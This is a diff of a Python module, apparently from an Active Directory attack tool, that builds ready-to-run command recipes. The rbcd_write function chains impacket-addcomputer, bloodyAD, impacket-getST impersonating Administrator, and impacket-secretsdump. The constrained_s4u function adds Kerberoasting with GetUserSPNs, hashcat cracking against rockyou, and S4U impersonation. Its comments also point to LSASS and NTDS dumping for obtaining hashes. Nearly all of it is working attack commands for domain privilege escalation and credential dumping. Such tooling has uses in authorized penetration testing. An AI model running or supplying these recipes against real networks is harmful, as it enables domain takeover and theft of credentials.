@@ -96,20 +96,28 @@ def rbcd_write(domain: str, dc: str, target: str, controlled_computer: str,
                    else (f"-hashes {nt_hash}" if nt_hash else ""))
     creds_flat = (f":'{password}'" if password
                   else (f":{nt_hash.split(':')[-1] if nt_hash else ''}"))
+    target_clean = target.rstrip('$')
+    controlled_clean = controlled_computer.rstrip('$')
     return [
-        "# 1. Add a controlled computer (needs MAQ > 0) — skip if you already have one:",
+        "# 1. Add a controlled computer (needs MAQ > 0). Skip if you already have one.",
         f"impacket-addcomputer -computer-name '{controlled_computer}' "
         f"-computer-pass 'Pwn3d!' {domain}/{username}{creds_flat} -dc-ip {dc}",
-        "# 2. Write msDS-AllowedToActOnBehalfOfOtherIdentity on the target:",
+        "",
+        "# 2. Grant the controlled computer RBCD on the target.",
         f"bloodyAD -d {domain} -u {username} {pwd_or_hash} --dc-ip {dc} "
         f"add rbcd '{target}' '{controlled_computer}'",
-        "# 3. Request a TGS as any user (e.g. Administrator) via S4U:",
-        f"impacket-getST -spn cifs/{target}.{domain} "
+        "",
+        "# 3. S4U: get a TGS as Administrator for cifs/<target> using the controlled computer.",
+        "#    The SPN must use the target's DNS hostname (no '$'), and we unset",
+        "#    KRB5CCNAME first so impacket doesn't load a stale ccache from a prior run.",
+        "unset KRB5CCNAME",
+        f"impacket-getST -spn 'cifs/{target_clean}.{domain}' "
         f"-impersonate Administrator -dc-ip {dc} "
-        f"{domain}/{controlled_computer.rstrip('$')}\\$:'Pwn3d!'",
-        "# 4. Use the ticket:",
-        f"export KRB5CCNAME=Administrator.ccache && "
-        f"impacket-secretsdump -k -no-pass {target}.{domain}",
+        f"'{domain}/{controlled_clean}$:Pwn3d!'",
+        "",
+        "# 4. Use the ticket. KRB5CCNAME is set inline so it doesn't leak to the next run.",
+        f"KRB5CCNAME=Administrator.ccache impacket-secretsdump "
+        f"-k -no-pass '{target_clean}.{domain}'",
     ]
 
 
@@ -384,12 +392,41 @@ def unconstrained_coerce(target_computer: str, domain: str, dc: str,
 def constrained_s4u(controlled_account: str, target_spn: str,
                     impersonate_user: str, domain: str, dc: str,
                     nt_hash: str | None = None) -> list[str]:
-    hash_arg = f"-hashes {nt_hash}" if nt_hash else "-no-pass"
+    """Recipe for constrained-delegation S4U abuse.
+
+    Critical: this needs `controlled_account`'s OWN credentials (password,
+    hash, or ccache). The bound user (the one running ADEX) is irrelevant
+    here — they can only request a TGS as someone else if they ARE that
+    someone else. If `controlled_account` is Kerberoastable, the recipe
+    pre-step is to crack their TGS hash; otherwise the operator needs to
+    have already pwned that account some other way.
+    """
+    if nt_hash:
+        cred_arg = f"-hashes {nt_hash}"
+        identity = f"{domain}/{controlled_account}"
+    else:
+        cred_arg = ""  # operator must edit in `:password` or `-hashes :NT`
+        identity = f"{domain}/{controlled_account}:<PASSWORD-OR-CRACK-VIA-KERBEROAST>"
     return [
-        f"# {controlled_account} is allowed to delegate to {target_spn}.",
-        "# Use S4U2Self+S4U2Proxy to obtain a TGS as any user for that SPN:",
-        f"impacket-getST {hash_arg} -spn {target_spn} "
-        f"-impersonate {impersonate_user} -dc-ip {dc} {domain}/{controlled_account}",
+        f"# {controlled_account} can delegate to {target_spn}.",
+        f"# Prerequisite: you need {controlled_account}'s credentials. If they",
+        "# have an SPN (Kerberoastable), crack their TGS hash first. Otherwise",
+        "# obtain their hash some other way (LSASS dump, NTDS, etc.).",
+        "",
+        "# 1. (If Kerberoastable) crack the account's hash:",
+        f"impacket-GetUserSPNs {domain}/<your-creds> -dc-ip {dc} "
+        f"-request-user {controlled_account} -outputfile tgs.hash",
+        "hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt",
+        "",
+        "# 2. S4U as that account, impersonating the target user. Unset KRB5CCNAME",
+        "#    first so impacket doesn't try to read a stale ccache from a prior run.",
+        "unset KRB5CCNAME",
+        f"impacket-getST {cred_arg} -spn '{target_spn}' "
+        f"-impersonate {impersonate_user} -dc-ip {dc} '{identity}'".strip(),
+        "",
+        "# 3. Use the resulting ticket (pin KRB5CCNAME inline so it doesn't leak):",
+        f"KRB5CCNAME={impersonate_user}.ccache impacket-secretsdump "
+        f"-k -no-pass <target-fqdn>",
     ]
 
 
